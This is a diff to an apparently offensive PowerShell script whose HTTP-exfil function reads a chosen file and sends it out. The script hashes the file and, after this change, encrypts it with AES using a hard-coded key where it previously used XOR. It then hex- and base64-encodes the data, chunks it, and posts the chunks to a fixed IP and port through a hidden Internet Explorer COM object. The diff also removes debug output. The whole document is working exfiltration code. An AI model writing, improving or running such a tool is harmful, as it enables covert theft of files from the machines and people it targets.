@@ -1,7 +1,6 @@
 function Send-HTTPRequest {
     param ([string] $data, [System.__ComObject] $IE)
-    $url = 'http://192.168.0.24:8080/';
-    $data = Xor $data;
+    $url = 'http://192.168.0.17:8080/';
     $data = Base64 $data;
     $IE.navigate2($url+$data)
     Start-Sleep -s 2;
@@ -10,15 +9,14 @@ function Send-HTTPRequest {
 function HTTP-exfil {
     param ([string] $file)
     $bytes = [System.IO.File]::ReadAllBytes($file)
-    
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
+    $hash = $hash -replace '-','';
     $IE = new-object -com internetexplorer.application;
-    $data = [System.IO.File]::ReadAllBytes($file);
+    $data = [System.IO.File]::ReadAllBytes($file)
+    $data = AES $data
     $string = [System.BitConverter]::ToString($data);
     $string = $string -replace '-','';
-    
-    $hash = $hash -replace '-','';
     $filename = Split-Path $file -leaf
     $len = $string.Length;
     #$split = Get-Random -minimum 1 -maximum 250;
@@ -32,13 +30,9 @@ function HTTP-exfil {
     for($i=0; $i-lt$repeat-1; $i++){
         $str = $string.Substring($i * $Split, $Split);
         $data = $jobid + '|!|' + $i + '|!|' + $str
-        echo $i
-        echo $split
-        echo $str
         $q = Send-HTTPRequest $data $IE
     };
     if($remainder){
-        echo $string
         $str = $string.Substring($len-$remainder);
         $i = $i +1
         $data = $jobid + '|!|' + $i + '|!|' + $str
@@ -56,17 +50,28 @@ function Base64 {
     return [Convert]::ToBase64String($Bytes)    
 }
 
-function Xor {
-    param ([string] $data)  
-    $enc = [system.Text.Encoding]::UTF8
-    $bytes = $enc.GetBytes($data)
+function AES {
+    param ([byte[]] $data)
+
     $key = "THISISACRAZYKEY"
-    for($i=0; $i -lt $bytes.count ; $i++)
-    {
-        $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
-    }
-    return [System.Text.Encoding]::ASCII.GetString($bytes)
-}
+    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
+
+    $AES = New-Object System.Security.Cryptography.AesManaged
+    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $AES.BlockSize = 128
+    $AES.KeySize = 256
+    $AES.Padding = "PKCS7"
+    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
+
+    $IV = new-object "System.Byte[]" 16
+    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+    $RNGCrypto.GetBytes($IV)
+    $AES.IV = $IV
+
+    $Encryptor = $AES.CreateEncryptor()
+
+    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
+};
 
 function Convert-ToCHexString {
     param ([String] $str) 
